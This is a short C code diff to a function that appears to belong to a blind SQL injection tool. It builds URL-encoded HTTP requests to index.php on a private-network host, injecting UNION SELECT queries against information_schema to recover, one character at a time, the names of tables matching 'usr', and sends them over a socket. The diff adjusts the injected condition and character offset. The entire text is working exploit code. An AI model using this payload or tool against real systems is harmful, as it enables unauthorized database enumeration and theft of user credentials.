@@ -235,15 +235,15 @@ bool check_table(const void *ctx) {
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20"
         "FROM%%20information_schema.TABLES%%20"
         "WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20"
-        "AND%%20CONCAT%%28%%22%%3C%%22%%2Ctable_name%%2C%%22%%3C%%22%%29%%20LIKE%%20%%27%%3c%s%%25%%27%%20" // %s = discovered (Literal)
-        "AND%%20ASCII(SUBSTR(table_name,%i,1))<%%3dASCII(%%27%s%%27)%%20"
+        "AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
+        "AND%%20ASCII(SUBSTR(CONCAT%%28%%22%%3C%%22%%2Ctable_name%%2C%%22%%3C%%22%%29,%i,1))<%%3dASCII(%%27%s%%27)%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, table_ctx->discovered, table_ctx->index + 1, table_ctx->guess);
+    sprintf(mal_req, fmt, table_ctx->discovered, table_ctx->index + 2, table_ctx->guess);
     _send(table_ctx->sockfd, mal_req, strlen(mal_req));
     return recv_empty(table_ctx->sockfd);
 }
